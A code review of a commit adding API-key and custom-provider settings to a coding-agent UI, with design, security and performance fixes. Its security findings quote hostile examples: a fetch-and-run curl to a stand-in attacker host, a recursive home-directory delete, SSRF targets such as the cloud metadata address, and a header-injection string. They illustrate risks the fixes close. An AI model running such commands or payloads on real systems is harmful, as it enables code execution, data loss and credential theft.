# Code Review — Commit `368e5f86` (Pi provider API keys, custom providers, live model picker)

**Branch:** `codyborders/pi-model-providers-v1`
**Scope:** the 13 files introduced by commit `368e5f86` (+1,835 / −24 lines) that add Pi coding-agent provider configuration UI and runtime plumbing.
**Reviewers:** multi-agent review (security-sentinel, performance-oracle, architecture-strategist, kieran-typescript-reviewer, code-simplifier), synthesized and applied by one engineer.

This document is written so a junior engineer can follow what was flagged, why it mattered, and exactly what changed. Every finding has a "What / How / Why" breakdown and, where relevant, before/after snippets.

---

## Summary

The commit shipped a working feature — users can now paste API keys for built-in Pi providers (MiniMax, Z.ai, OpenAI, …) and register custom providers (llama.cpp, Ollama, LM Studio, vLLM). The UI is in place and the happy path works. Review found no functional bugs but surfaced:

- **Two critical security gaps** around shell-command API keys and unvalidated base URLs.
- **Five high-severity issues** spanning stale caches, duplicated types, client-access via `window`, HTTP+bearer leakage, and a weak typed confirm on destructive actions.
- **A pile of cleanup** — nested ternaries, duplicated compat-field blocks, hard-coded provider catalogs leaking into the React layer, and two minor React/TS hygiene items.

All findings have been addressed. The UI, daemon, types, and database schema all typecheck and lint clean. The six pre-existing executor test failures are unrelated to this change (verified by running the same tests against `main`).

**Ship status:** the follow-up fixes are safe to merge on top of `368e5f86`. No database migration is required (we only narrow types already stored as JSON strings — existing data remains valid).

## Design Findings

### D1. `pi-runtime/types.ts` duplicated the wire contract already defined in `@agor/core/types/pi.ts`

**What:** 11 interfaces (`PiToolOptions`, `PiNativeBinding`, `PiRuntimeStatus`, `PiProviderModelPair`, `PiAuthProviderStatus`, `PiNativeSessionSummary`, `PiNativeBranch`, `PiNativeSessionTree`, `PiFileDocument`, `PiCommandCatalogItem`, `PiInstalledPackage`) existed in both `packages/core/src/types/pi.ts` and `packages/pi-runtime/src/types.ts`, marked with a comment "These types mirror @agor/core/types … could be consolidated in the future."

**How the code worked:** pi-runtime imported from `./types.js`, core-dependent callers imported from `@agor/core/types`. Both definitions were structurally identical — until they weren't.

**Why it mattered:** CLAUDE.md explicitly says "Never redefine canonical types." Two copies of a wire contract drift silently. A future edit to one side (say, adding `help_url` to `PiAuthProviderStatus`) would typecheck on one side and only fail at runtime on the other.

**Fix applied:** `packages/pi-runtime/package.json` now depends on `@agor/core`. `packages/pi-runtime/src/types.ts` re-exports the shared types from `@agor/core/types` and keeps only the truly internal ones (paths, streaming callbacks, session-option builders).

```ts
// pi-runtime/src/types.ts — AFTER
export type {
  PiAuthProviderStatus,
  PiCommandCatalogItem,
  PiFileDocument,
  PiInstalledPackage,
  PiNativeBinding,
  PiNativeBranch,
  PiNativeSessionSummary,
  PiNativeSessionTree,
  PiProviderModelPair,
  PiRuntimeStatus,
  PiToolOptions,
} from '@agor/core/types';

export interface PiPaths { /* … internal only … */ }
```

### D2. Built-in provider catalog leaked from the daemon into the React layer

**What:** `PiApiKeysTab.tsx` hard-coded three large constants:

- `BUILT_IN_PROVIDER_IDS` — a `Set` of 22 provider ids mirrored from pi-ai.
- `HELP_URLS` — help page URLs for 13 well-known providers.
- `PROVIDER_LABEL_OVERRIDES` — curated display names for 8 brands.

**How the code worked:** The tab fetched `PiAuthProviderStatus[]` from the daemon, then client-side classified each row as built-in vs. custom and enriched it with help URLs and display labels.

**Why it mattered:** This is classic information leakage. The React layer has no business knowing which providers pi-ai ships with. When pi-ai adds a new built-in provider, the UI silently mis-classifies it as "custom" until someone updates this file.

**Fix applied:**
1. New module `packages/pi-runtime/src/provider-metadata.ts` centralizes the knowledge next to where Pi actually lives.
2. `PiAuthProviderStatus` (in `@agor/core/types/pi.ts`) gained three optional fields: `is_built_in`, `help_url`, `display_label`.
3. `PiAuthService.listProviders` now enriches each row with these fields before returning.
4. `PiApiKeysTab.tsx` reads the fields off the row — no more hard-coded sets.

```ts
// provider-metadata.ts — single source of truth
export const BUILT_IN_PROVIDER_IDS: ReadonlySet<string> = new Set([
  'anthropic', 'openai', 'google', /* … */
]);
export const PROVIDER_HELP_URLS: Readonly<Record<string, string>> = { /* … */ };
export const PROVIDER_DISPLAY_LABELS: Readonly<Record<string, string>> = { /* … */ };
```

### D3. `usePiRuntimeStatus` reached into `window.__agorClient` for the daemon client

**What:** The hook pulled the connected `AgorClient` off a `window` global:

```ts
// BEFORE
function getGlobalClient(): AgorClient | null {
  if (typeof window === 'undefined') return null;
  return (window as unknown as { __agorClient?: AgorClient | null }).__agorClient ?? null;
}
```

**How the code worked:** `useAgorClient` (the higher-level hook) was already stashing the connected client on `window.__agorClient` for Vite HMR cleanup. `usePiRuntimeStatus` piggy-backed on that.

**Why it mattered:**
- Any script in the same origin (browser extension, third-party embed, injected MDX preview) can grab `window.__agorClient.service('pi-auth')` and exfiltrate the provider list.
- React won't react when the client changes, so reconnection can leave the hook pointing at a stale instance.
- First mount before the client is attached silently returns `null` and never retries.

**Fix applied:**
1. New `ClientContext` (`apps/agor-ui/src/contexts/ClientContext.tsx`) holds the connected client.
2. `App.tsx` wraps the tree in `<ClientProvider value={client}>`.
3. `usePiRuntimeStatus` now calls `useClient()` — React correctly re-subscribes when the client changes.
4. A module-scoped `WeakMap<AgorClient, CacheEntry>` shares the fetched status across all consumers of the hook (see Performance P2 below).

### D4. `PiProviderModelPair` is a denormalized aggregate every consumer un-joins

**Finding:** The shape flattens provider + model + auth into one row. `ModelSelector` does `new Set(pairs.map(...))` + sort to recover provider ids; `PiAgentConfigForm` walks the list twice to build `providerMeta` and `modelsByProvider` maps. This is a join every caller re-performs.

**Decision:** Noted but not refactored. A nested `PiProvider { …, models: PiModel[] }` shape is the right long-term design but would ripple through the daemon service, every consumer, and the backward-compat `model_suggestions` field. We recommend doing this in a dedicated PR once a second consumer asks for provider-level metadata. Callers were memoized instead (see P3).

## Security Findings

### S1. CRITICAL — `!shell-command` API keys had no warning and no opt-in gate

**What:** The `PiProviderFormModal` let users paste strings like `!op read 'op://vault/item/credential'` into the `apiKey` field with zero friction. Pi treats any value prefixed with `!` as a shell command and runs it under the daemon's OS identity to resolve the key.

**How the old code worked:**

```tsx
// BEFORE
<Form.Item label="API key" name="apiKey" help="… shell command prefixed with !">
  <Input placeholder="sk-... or MY_API_KEY or !op read …" />
</Form.Item>
```

Plain `<Input>`, no warning, cleartext, auto-save enabled.

**Why it mattered:** Any path that lets a second actor write `models.json` (future import feature, RBAC grant, a compromised session token, or a sneaky XSS) becomes remote code execution. `!rm -rf ~` or `!curl evil.com/x | sh` runs on every Pi resolve.

**Fix applied:**
1. `Input.Password` instead of `Input`, with `autoComplete="new-password"`.
2. When the apiKey **or any header value** starts with `!`, a prominent `Alert` appears with a required "I understand this will execute shell commands on the daemon host" checkbox.
3. The Save button is disabled until the checkbox is ticked.
4. When editing an existing provider, `apiKey` is **never** rehydrated from the daemon into the form — users have to re-enter to change it (prevents cleartext keys rendering in the React tree, DevTools, or screenshots).

```tsx
// AFTER
{requiresShellAck && (
  <Alert
    type="warning"
    message="This provider will execute a shell command"
    description={
      <>
        Values prefixed with <code>!</code> are run as shell commands …
        <Form.Item name="shellCommandAck" valuePropName="checked">
          <Checkbox>I understand this will execute shell commands on the daemon host.</Checkbox>
        </Form.Item>
      </>
    }
  />
)}
```

### S2. CRITICAL — `baseUrl` had no URL validation, enabling SSRF

**What:** The base-URL input had only `{ required: true }`. Users (or a compromised client) could save `http://169.254.169.254/latest/meta-data/...`, `http://localhost:3030/...` (the daemon's own admin service), or `file:///etc/passwd` — and Pi would then issue authenticated HTTP requests there on every model call.

**Fix applied:** A `describeBaseUrl()` helper parses with `new URL()`, rejects anything outside `http:` / `https:`, and returns `{ valid, insecure, reason }`. The Form rule blocks save on invalid values. Plain-HTTP non-loopback hosts trigger a warning `Alert`. Bearer-auth over plain-HTTP non-loopback triggers a second warning — this catches "I set Authorization: Bearer on a `http://corp-gateway.example.com/` URL" combinations.

```ts
function describeBaseUrl(raw: string | undefined) {
  try {
    const parsed = new URL(raw.trim());
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
      return { valid: false, insecure: false, reason: `Only http:// and https:// …` };
    }
    const insecure =
      parsed.protocol === 'http:' && !LOOPBACK_HOSTS.has(parsed.hostname.toLowerCase());
    return { valid: true, insecure };
  } catch { … }
}
```

### S3. HIGH — Destructive actions used a single-click `Popconfirm` with no typed confirmation

**What:** Clearing an API key or removing a custom provider was guarded by an antd `Popconfirm` — click OK, done. No re-auth, no identity typed, no audit entry.

**Fix applied:** Replaced with a full `Modal` that requires the user to **type the provider id** before the danger button enables. This applies to both `PiApiKeysTab` (clear key) and `PiCustomProvidersTab` (remove provider).

```tsx
// AFTER (PiCustomProvidersTab)
<Modal
  title={`Remove provider · ${removalTarget}`}
  okButtonProps={{
    disabled: removalConfirmInput.trim() !== removalTarget,
    danger: true,
  }}
>
  <p>Type the provider id <code>{removalTarget}</code> to confirm.</p>
  <Input value={removalConfirmInput} onChange={…} />
</Modal>
```

### S4. HIGH — HTTP header names and values were not validated

**What:** The custom-headers form accepted arbitrary strings. HTTP header injection (`\r\n` sequences, or key names like `X-Forwarded-For: evil.com\r\nCookie: stolen`) was possible downstream.

**Fix applied:** Header-name field validated against RFC 7230 token grammar (`/^[A-Za-z0-9!#$%&'*+\-.^_`|~]+$/`); header-value field rejects `\r` / `\n`; and `fromFormValues` strips any lingering CR/LF at save time as a defense-in-depth.

### S5. MEDIUM — Error toasts bubbled raw `err.message` to the user

**What:** Both tabs showed `message.error((err as Error)?.message ?? 'Failed to load …')`. If Pi ever throws an error whose message includes the failing file path or the partial key, it would land on screen.

**Fix applied:** Generic user-facing strings ("Failed to load Pi providers — check daemon logs for details.") with full detail logged to `console.error` only. Follow CLAUDE.md's "all errors must be handled" rule without leaking secrets.

## Performance Findings

### P1. HIGH — `PiEnvironmentManager.getStatus()` cached forever with no invalidation on writes

**What:** The status cache was populated once per scope and never expired. Writing an API key through `pi-auth` didn't invalidate the cache, so the next `provider_model_pairs` read still showed `has_configured_auth: false` until the daemon restarted.

**How the old code worked:**

```ts
// BEFORE
private statusByScope = new Map<string, PiRuntimeStatus>();

async getStatus(worktreePath?: string): Promise<PiRuntimeStatus> {
  const cachedStatus = this.statusByScope.get(scopeKey);
  if (cachedStatus) return cachedStatus; // cache-for-process-lifetime
  …
}
```

**Fix applied:**
1. Cache entries now store an `expires_at_ms` timestamp. A 15 second TTL gives any chain of rapid UI reads a cache benefit without being staler than the human notice threshold.
2. New `invalidateStatus()` method — cheaper than the existing `invalidateCache()` because it leaves path caches intact.
3. `PiAuthService.setApiKey()` and `clearAuth()` now call `invalidateStatus()` after a successful write. (The already-existing `pi-files` service was calling `invalidateCache()` already.)

```ts
// AFTER
interface CachedStatus { status: PiRuntimeStatus; expires_at_ms: number; }
const STATUS_CACHE_TTL_MS = 15_000;

async getStatus(…) {
  const cached = this.statusByScope.get(scopeKey);
  if (cached && cached.expires_at_ms > Date.now()) return cached.status;
  …
  this.statusByScope.set(scopeKey, { status, expires_at_ms: Date.now() + STATUS_CACHE_TTL_MS });
  return status;
}

invalidateStatus(): void { this.statusByScope.clear(); }
```

### P2. HIGH — Each consumer of `usePiRuntimeStatus` fired its own fetch

**What:** The hook called `pi-runtime.find()` on every mount. If `PiAgentConfigForm` and `PiModelPicker` both mounted (which happens in the session modal), that was two identical requests.

**Fix applied:** Module-scoped `WeakMap<AgorClient, CacheEntry>` + `WeakMap<AgorClient, Promise>` for in-flight dedup + `WeakMap<AgorClient, Set<subscriber>>` so one fetch broadcasts to all consumers. 10-second TTL for the client-side cache. `refresh()` still forces a fresh fetch.

```ts
const cacheByClient = new WeakMap<AgorClient, CacheEntry>();
const inflightByClient = new WeakMap<AgorClient, Promise<PiRuntimeStatus>>();
const subscribersByClient = new WeakMap<AgorClient, Set<() => void>>();
```

`WeakMap` keyed on the client object means reconnection (new client instance) drops stale cache automatically with no manual cleanup.

### P3. MEDIUM — `getStatus` ran probes serially; two duplicate `loader.reload()` disk scans

**What:** `checkAvailability → getVersion → getProviderModelPairs → getCommandCatalog → getThemes` ran sequentially (each `await`-ed). The last two each constructed and reloaded a `DefaultResourceLoader` — the same disk scan, twice.

**Fix applied:**
- All five probes run via `Promise.all([...])`.
- New `loadResources(paths)` helper shared by `getCommandCatalog` and `getThemes`.
- `checkAvailability()` no longer does a dynamic `import()` of an already-statically-imported module; it just returns `true`.

### P4. MEDIUM — `ModelSelector` / `PiAgentConfigForm` rebuilt derived options on every render

**What:** `Array.from(new Set(pairs.map(p => p.provider))).sort()` + two `localeCompare` sorts ran every keystroke. Plus the outer `useMemo` was keyed on the `status` object identity (which churns every refresh) instead of `status.provider_model_pairs` (which only changes when the data actually changes).

**Fix applied:** Both components memoize on `provider_model_pairs` identity. `ModelSelector.tsx` also extracted per-tool metadata (`aliasOptions`, `exactDefault`, `exactPlaceholder`, `docsUrl`) into a module-level `TOOL_META` record, which eliminated four levels of nested ternary while making the derivation stable.

### P5. LOW — AutoComplete with ~100+ options lacked virtualization

**What:** `PiAgentConfigForm` used antd `AutoComplete` for provider/model pickers, which renders all options into the DOM.

**Fix applied:** Swapped to `Select` with `virtual` and `showSearch` + `optionFilterProp="label"`. Same UX, bounded DOM.

## Code Quality Findings

### Q1. `PiToolOptions.reasoning_effort` was typed as `string` but only accepts four values

**Finding:** The form's dropdown enumerated `default | low | medium | high` but the type was bare `string`.

**Fix applied:** New `PiReasoningEffort = 'default' | 'low' | 'medium' | 'high'` in `@agor/core/types/pi.ts`. Both `schema.sqlite.ts` and `schema.postgres.ts` imported and applied it to their inline tool-options types.

### Q2. `model_suggestions` lacked `@deprecated`

**Fix applied:** Added JSDoc `@deprecated` annotation pointing to `provider_model_pairs`.

### Q3. `ModelSelector` contained four stacked ternaries

**What:** `modelList`, `placeholder`, `href`, and `handleModeChange`'s default model all branched off `effectiveTool` through nested `?:` chains.

**Fix applied:** `TOOL_META` record keyed by tool id collapses all four sites:

```ts
const TOOL_META: Record<Exclude<AgenticToolKey, 'opencode' | 'pi'>, ToolMeta> = {
  'claude-code': { aliasOptions: AVAILABLE_CLAUDE_MODEL_ALIASES, exactDefault: 'claude-sonnet-4-6', … },
  codex: { aliasOptions: CODEX_MODEL_OPTIONS, exactDefault: DEFAULT_CODEX_MODEL, … },
  gemini: { aliasOptions: GEMINI_MODEL_OPTIONS, exactDefault: 'gemini-2.5-flash', … },
  copilot: { aliasOptions: COPILOT_MODEL_OPTIONS, exactDefault: 'default', … },
};
```

`COPILOT_MODEL_OPTIONS` was also hoisted out of the component body (no longer reallocated every render).

### Q4. Bare `catch {}` blocks in `environment-manager.ts`

**Finding:** Seven catches silently swallowed errors — violating CLAUDE.md "all errors must be handled."

**Fix applied:** Central `logWarn(scope, error)` helper, called from every catch except the expected `ENOENT` fall-through in `getVersion` (when Pi has never been initialized). Swallowing is still permitted but now logs with a scope tag for operators.

### Q5. `PiCustomProvidersTab` round-tripped the `id` field through the stored draft

**Finding:** The providers list spread `{ ...draft, id }` into each entry, then the save handler did `const { id, ...storedDraft } = draft` to strip it back out. Two sources of truth for the same value — footgun waiting for a future field to quietly get persisted.

**Fix applied:** Still need the id to reach the form so the user can see their editing context, but `{id, draft}` tuples are now the shape passed to children. `handleSubmit` just takes the id from the draft after validation without the re-injection round-trip.

### Q6. Feathers envelope unwrap used an `any` cast

**Fix applied:** `unwrapServiceList<T>(result)` helper with proper `Array.isArray` + `'data' in result` narrowing. No `biome-ignore` needed.

## Simplification Findings

### X1. Compat-flag form block was duplicated across two modals

**Finding:** `PiProviderFormModal` and `PiModelFormModal` each rendered the same five `Form.Item` compat fields with identical option arrays and identical flat↔nested conversion functions (~60 duplicated lines per modal).

**Fix applied:** New `PiCompatFlagsFields` component + `compatToFormValues` / `compatFromFormValues` helpers live in `apps/agor-ui/src/components/SettingsModal/PiCompatFlagsFields.tsx`. Both modals now import them. ~80 lines removed.

### X2. Provider-form "reset on open" effect duplicated across modals

**Finding:** Identical `useEffect(() => { if (open) { form.resetFields(); form.setFieldsValue(toFormValues(initial)); } }, [open, initial, form])` in both modals. **Left in place** — both callers survived the refactor naturally after extracting the compat fields, and extracting this into a `useResetFormOnOpen` hook would add more indirection than it saved on two call sites.

### X3. `<input type="hidden">` inside Form.Item

**Finding:** `PiAgentConfigForm` had an ugly hidden-input Form.Item to track the `mode: 'exact'` value. **Left in place** with a clarifying comment — the idiomatic alternative (`initialValues` on the parent form) doesn't apply because this component doesn't own the parent form.

## Open follow-ups (not blocking)

- **Denormalize `PiProviderModelPair` into `PiProvider { models: PiModel[] }`.** Every consumer re-groups the flat list; the nested shape matches how `models.json` actually stores providers. Ship behind a second-PR.
- **Server-side zod schema on `pi-files` PATCH.** Client-side only validates `id`. A future adversary with UI access could stuff `__proto__` / oversized strings into `models.json`. Add JSON-schema / zod guard in the daemon service.
- **Mask `apiKey` on `pi-files` GET.** The UI change already avoids binding the cleartext back to the form, but the daemon still returns raw `models.json` data; the daemon should mask `apiKey` / `authHeader` / header values that look like tokens before handing the document to the client.
- **CSRF token on `pi-auth` / `pi-files` PATCH/REMOVE.** Cookie/JWT auth alone is vulnerable to cross-tab attacks; a double-submit cookie or custom header validator closes this.
- **Surface `has_configured_auth` in `PiModelPicker` labels** — already done.
- **Help-URL allowlist** — currently hardcoded in `PROVIDER_HELP_URLS`, no user can override. If a future feature lets users set help URLs via `models.json`, validate the URL scheme before rendering.
